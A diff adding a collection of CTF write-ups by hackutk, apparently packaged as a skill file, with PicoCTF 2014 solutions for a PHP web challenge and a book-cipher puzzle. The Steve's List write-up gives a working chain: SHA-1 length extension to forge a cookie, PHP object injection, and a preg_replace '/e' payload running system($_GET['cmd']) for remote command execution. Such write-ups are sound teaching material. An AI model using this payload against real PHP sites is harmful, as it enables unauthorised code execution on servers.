@@ -1,0 +1,263 @@
+<!--
+LICENSE UPL
+Author: Mauro Risonho de Paula Assumpção
+Data Create: 2026-03-16
+Data Update: 2026-03-16
+-->
+
+---
+name: writeup-hackutk
+description: CTF writeups and security challenges by hackutk.
+---
+
+# Writeups by hackutk
+
+Source repository: `/repos/hackutk`
+
+## Repository Index
+
+- writeups/README.md
+- writeups/template.md
+- writeups/picoctf2014/steves-list/README.md
+- writeups/picoctf2014/valley-of-fear/README.md
+
+## Writeup Content
+
+
+### File: writeups/README.md
+
+# CTF Writeups
+
+### HackUTK Write-ups
+Any write-ups we do as an organization, push them to this repository.
+
+
+### Resources
+There is a Github Repository with write-ups compiled from people everywhere pertaining to tons of CTF's. You can find it here: https://github.com/ctfs
+
+
+
+### File: writeups/picoctf2014/steves-list/README.md
+
+Steve's List - PicoCTF 2014
+===
+
+###Problem: 
+
+Section Chief Steve was super proud of the website he was writing, but he's pretty new to programming. When Daedalus Corp caught wind of this, they hacked [his site](http://steveslist.picoctf.com/). Steve still has an [old backup](https://picoctf.com/problem-static/web/steves-list/handout.zip), but they changed the secrets! They sent us a cryptic message saying they bet we couldn't read /home/daedalus/flag.txt. Can you go get it for us? 
+
+###Analysis: 
+
+A quick look through the source code of the website shows that the `custom_settings` cookie is parsed into an array of strings, which are then deserialized as PHP objects. If we can modify this cookie, we may be able to inject a PHP object:
+
+```php
+    $settings_array = explode("\n", $custom_settings);
+    $custom_settings = array();
+    for ($i = 0; $i < count($settings_array); $i++) {
+      $setting = $settings_array[$i];
+      $setting = unserialize($setting);
+      $custom_settings[] = $setting;
+    }
+```
+ 
+Unfortunately, the cookie is signed by the server using a SHA-1 hash of a secret value + the cookie. If the signature doesn't match, the server won't deserialize our object:
+
+```php
+    $hash = sha1(AUTH_SECRET . $custom_settings);
+    if ($hash !== $_COOKIE['custom_settings_hash']) {
+      die("Why would you hack Section Chief Steve's site? :(");
+    }
+```
+
+Fortunately, the way the signature is calculated isn't secure. Using the cookie and signature pair that the server gives us, we can use a length-extension attack to make a new cookie with added data, and a valid signature for it, without knowing the secret. [HashPump](https://github.com/bwall/HashPump) is a good open-source program for doing this.
+
+Now that we can inject PHP objects, the next step is to figure out a way to use this for our advantage. Unlike Python's pickle module, PHP's serialize won't just let us execute arbitrary code as-is. We'll have to exploit an existing class on the website by creating an instance which will do somethign dangerous. The Post class (in includes/classes.php) seems like a good target, because it implements the magic `__destruct` method which will be executed automatically when the object is destroyed:
+
+```php
+    function __destruct() {
+      // debugging stuff
+      $s = "<!-- POST " . htmlspecialchars($this->title);
+      $text = htmlspecialchars($this->text);
+      foreach ($this->filters as $filter)
+        $text = $filter->filter($text);
+      $s = $s . ": " . $text;
+      $s = $s . " -->";
+      echo $s;
+    }
+```
+
+At first there's no obvious way to use this function to our advantage, but it turns out the `filter` function uses `preg_replace`, which will execute arbitrary PHP for us if the 'e' modifier is set (WTF PHP?).
+
+
+###Solution: 
+
+Construct a Post object that will run commands for us:
+
+```php
+$filters = array(new Filter('/.*/e', 'system($_GET["cmd"])'));
+$post = new Post('', '', $filters);
+echo bin2hex(serialize($post));
+```
+
+Use HashPump to append this value (seperated by a newline) to our cookie, with a valid signature.
+
+Now we can run arbitrary system commands via the cmd parameter. shell.py uses this to present a rudimentary shell.
+
+After a bit of searching the flag is easily found:
+
+```
+[joseph@jcmbp steves-list]$ python shell.py 
+$ ls /home
+daedalus
+ubuntu
+$ ls /home/daedalus
+flag.txt
+$ cat /home/daedalus/flag.txt
+D43d4lu5_w45_h3r3_w1th_s3rialization_chief_steve
+```
+
+
+
+### File: writeups/picoctf2014/valley-of-fear/README.md
+
+The Valley of Fear - PicoCTF
+===
+
+###Problem Statement: 
+The hard drive may be corrupted, but you were able to recover a small chunk of text. Scribbled on the back of the hard drive is a set of mysterious numbers. Can you discover the meaning behind these numbers? (1, 9, 4) (4, 2, 8) (4, 8, 3) (7, 1, 5) (8, 10, 1)
+
+---
+
+The **small chunk of text** referenced above is as follows:
+
+It might have been expected that the attempt to trace to their origin
+in the past the institutions and customs in common use upon the sea
+would from an early date occupy the attention of a seafaring people,
+but for some obscure reason the British nation has always been
+indifferent to the history of its activities upon that element on which
+its greatness was founded, and to which it has become more and more
+dependent for its daily bread and its very existence. To those who
+are alive to this fact it will hardly come as a surprise, therefore,
+to learn that the first sustained attempt at a detailed investigation
+into the history of the flag at sea was made under the patronage
+of the German Admiralty by a German Admiral. Vice-Admiral Siegel's
+_Die Flagge_, published in 1912, was the first book to deal with the
+development of the flag at sea in a scientific spirit, and although
+the earlier chapters contain some mistakes due to his employment of
+translations of early works instead of original texts, and the accounts
+of the British flags in the later chapters suffer because he had no
+access to original records, it is a worthy piece of work.
+
+The present book is an attempt to remove the reproach to the British
+nation which this implies. Its plan is somewhat different from that
+of the work referred to above. Instead of dealing with the flags of
+all maritime nations of the world--a task that (if it was to be more
+than a mere copying or compilation) would entail much work in foreign
+archives--it seemed more profitable to concentrate upon the history
+of British Naval Flags, for researches made so far back as 1908 had
+taught me how much that is inaccurate about their history had received
+acceptance. But first it seemed necessary to devote some time and
+space to the inquiry into the origin of the flag and how it became the
+honoured symbol of nationality that it now is, and for this a general
+view had to be taken in order that a firm foundation might be laid for
+the early history of our own flags.
+
+In the first chapter the ground worked over by Admiral Siegel has been
+solidified by examination of the original authorities, with the result
+that a few errors have been detected and some new facts brought to
+light, and the investigation has also been extended further; the most
+important of the additions being those relating to the standards in
+the Phoenician and Greek ships of war, forms of the early "standard"
+and "gonfanon," and the Genoese Standard of St George and the Dragon.
+For the deduction that the use of a national flag arose in the Italian
+city states I take the entire responsibility, well aware that further
+investigations may possibly bring to light fresh facts which will
+overthrow it.
+
+The chapter on early English, Scottish and Irish flags serves as an
+introduction to the history of our national flag, which was invented
+for the use of the mercantile marine, though it was very soon
+appropriated by the Royal Navy for its sole use. It is very improbable
+that further research will enable the gap left by the unfortunate
+destruction of the early 17th century records to be filled, so that the
+story of the Union Flag may be taken as being substantially complete,
+but there is still room for further work upon the history of its
+component crosses. It will be seen that I have been unable to find any
+solid ground for the common belief that the cross of St George was
+introduced as the national emblem of England by Richard I, and am of
+opinion that it did not begin to attain that position until the first
+years of the reign of Edward I.
+
+The chapters on the flags used to indicate distinctions of command and
+service at sea give an account of the use (now obsolete) of the Royal
+Standard at sea by naval commanders-in-chief; of the history of the
+Admiralty anchor-flag; and of the steps by which the present Admirals'
+flags were evolved. The history of the ensigns from their first
+adoption at sea about the end of Elizabeth's reign has been set out in
+some detail, but further research may bring to light more details of
+interest in the years between 1574 and 1653. The causes which led to
+the adoption of a red ensign as the most important British ensign and
+the steps which led to its appropriation to the Mercantile Marine, and
+not the Royal Navy, are stated as far as the records availed, though
+here again further research is needed in the late Elizabethan and
+early Stuart periods among records that may still survive in private
+ownership. These chapters may, perhaps, appeal rather to the seaman
+and the student of naval history than to the general reader, but it is
+hoped that they may also prove of service to artists who wish to avoid
+the anachronisms into which some of their brethren have been betrayed.
+
+In order that the development of flag signals may be properly
+appreciated it has been necessary, when dealing with the earlier years,
+to take into account what had happened outside the narrow circuit of
+British waters. The earlier matter, though here examined solely from
+the point of view of the flags used, offers considerable interest to
+the student of naval tactics, with which indeed the art of signalling
+is inseparably connected.
+
+The last chapter, on Ceremonial and other usages, is, from the author's
+point of view, the least satisfactory. From the nature of the subject,
+the official records contain very little information about it. It
+is only by the slow and laborious process of examining contemporary
+journals, diaries, accounts of voyages, and similar material that facts
+can be found for any exhaustive treatment of these matters. Something
+of this has been done, but more remains to do.
+
+In concluding the work which has occupied a large portion of the
+leisure hours of many years, it is my pleasant duty to express my
+gratitude to the numerous friends whose encouragement and assistance
+have enabled me to persevere in what has proved a somewhat arduous
+task; especially to Sir Julian Corbett, who has read the proofs and
+given me the benefit of his criticisms; to the officials of the
+Pepysian Library, Public Record Office, British Museum and London
+Library for the facilities afforded me; and not least to my friend Mr
+Vaughan who has spared no pains in the preparation of the coloured
+plates.
+
+
+###Solution: 
+
+Each tuple of three numbers corresponds to parts of the text: 
+
+*(paragraph, row in the paragraph, word in the row)*
+
+Therefore, the tuple (1, 9, 4) corresponds to the first paragraph, 9th row of the paragraph, and 4th word in that row.
+
+
+(1, 9, 4)  -> "the"<br>
+(4, 2, 8)  -> "flag"<br>
+(4, 8, 3)  -> "is"<br>
+(7, 1, 5)  -> "Ceremonial"<br>
+(8, 10, 1) -> "plates"<br>
+
+
+### File: writeups/template.md
+
+Challenge Name - CTF Name
+===
+
+###Problem: 
+
+###Analysis: 
+ 
+###Solution: 
+
